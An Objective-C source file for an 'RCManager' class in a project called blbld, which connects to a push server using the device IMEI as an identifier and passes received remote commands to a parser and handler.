//
//  RCManager.m
//  blbld
//
//  Created by Makara Khloth on 10/12/16.
//
//

#import "RCManager.h"
#import "RCCommand.h"
#import "RCParser.h"
#import "RCHandler.h"

#import "PushNotificationManager.h"
#import "PhoneInfo.h"

@implementation RCManager

@synthesize pushServerUrl = _pushServerUrl;
@synthesize pushServerPort = _pushServerPort;
@synthesize pushNotificationManager = _pushNotificationManager;
@synthesize macInfo = _macInfo;

- (instancetype) init {
    self = [super init];
    if (self) {
        _pushNotificationManager = [[PushNotificationManager alloc] init];
        _pushNotificationManager.mPushDelegate = self;
    }
    return self;
}

- (void) start {
    NSString *deviceID = [[self.macInfo getIMEI] stringByAppendingString:@"_watchdog"];
    [self.pushNotificationManager startWithServerName:self.pushServerUrl
                                                 port:self.pushServerPort
                                             deviceID:deviceID];
}

- (void) stop {
    [self.pushNotificationManager stop];
}

- (void) remoteCommandPushRecieved: (id) aPushCommand {
    DLog(@"Watchdog got push cmd: %@", aPushCommand);
    RCCommand *command = [RCParser parse:aPushCommand];
    [RCHandler handleCommand:command];
}

@end
